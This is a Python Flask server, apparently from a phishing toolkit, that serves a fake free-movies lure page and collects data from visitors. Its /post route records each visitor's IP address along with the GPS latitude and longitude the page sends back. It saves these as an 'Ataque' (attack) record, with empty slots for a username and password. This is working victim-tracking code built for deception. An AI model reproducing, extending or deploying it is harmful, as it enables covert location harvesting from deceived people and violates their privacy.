from flask import Flask, render_template, request, redirect
from datetime import datetime
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from controls import *
import subprocess
import sqlalchemy
from sqlalchemy.orm import sessionmaker
from db.model import Ataque  # Certifique-se de que Ataque está importado corretamente

# Importar logging aqui dentro da função para garantir que só seja importado quando necessário
import logging

# Configuração do SQLAlchemy
conexao = sqlalchemy.create_engine('sqlite:///db/dados.db')
Session = sessionmaker(bind=conexao)
db = Session()

app = Flask(__name__)

# Desativar os logs de werkzeug
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/', methods=["GET"])
def home():
    return render_template("filmes.html")

@app.route('/filmes-2024', methods=["GET"])
def filme2024():
    return render_template("filmes.html")

@app.route('/seriados', methods=["GET"])
def seriados():
    return render_template("filmes.html")

@app.route('/free-movies', methods=["GET"])
def freemovie():
    return render_template("filmes.html")
    
@app.route('/post', methods=["POST"])
def receber():
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        user_ip = request.remote_addr  
    dados = {
        "tipo": "Localizacao",
        "ip": user_ip,
        "latitude": request.form.get('latitude'),
        "longitude": request.form.get('longitude'),
        "username": '--------------',
        "password": '--------------',
        "datetime": datetime.now()
    }
    print("---------------------------------------------Alguem Fez um Post------------------------------------------------")

    # Crie uma instância do modelo Ataque com os dados recebidos
    n = Ataque(type=dados['tipo'], ip=dados['ip'], latitude=dados['latitude'], longitude=dados['longitude'], username=dados['username'], password=dados['password'], datetime=dados['datetime'])

    # Adiciona o novo ataque ao banco de dados
    db.add(n)
    db.commit()
    
    GREEN = "\033[32m"
    WHITE = "\033[37m"
    RESET = "\033[0m"
    print(
        f"""
    {GREEN}Tipo:{RESET} {WHITE}{dados['tipo']}{RESET}
    {GREEN}IP:{RESET} {WHITE}{dados['ip']}{RESET}
    {GREEN}Latitude:{RESET} {WHITE}{dados['latitude']}{RESET}
    {GREEN}Longitude:{RESET} {WHITE}{dados['longitude']}{RESET}
    {GREEN}Usuario:{RESET} {WHITE}{dados['username']}{RESET}
    {GREEN}Senha:{RESET} {WHITE}{dados['password']}{RESET}
    {GREEN}Data:{RESET} {WHITE}{dados['datetime']}{RESET}
        """
    )
    
    return redirect('/')

if __name__ == "__main__":
    try:
        GREEN = "\033[32m"
        YELLOW = "\033[33m"
        RESET = "\033[0m"

        # Impressão das rotas com cores diferentes
        print(f"{GREEN}Rotas para este servidor:{RESET} \n{YELLOW}/filmes-2024 \n/\n/free-movies\n/seriados{RESET}")
        app.run(debug=True)
    except KeyboardInterrupt:
        print('\nFlask foi encerrado manualmente pelo usuário.')
        subprocess.run(['python', 'ghostermz.py'], check=True)
        sys.exit(1)  # Encerra o programa com código de erro 1

    except Exception as e:
        print(f'\nOcorreu um erro inesperado: {str(e)}')
        subprocess.run(['python', 'ghostermz.py'], check=True)
        sys.exit(1)  # Encerra o programa com código de erro 1
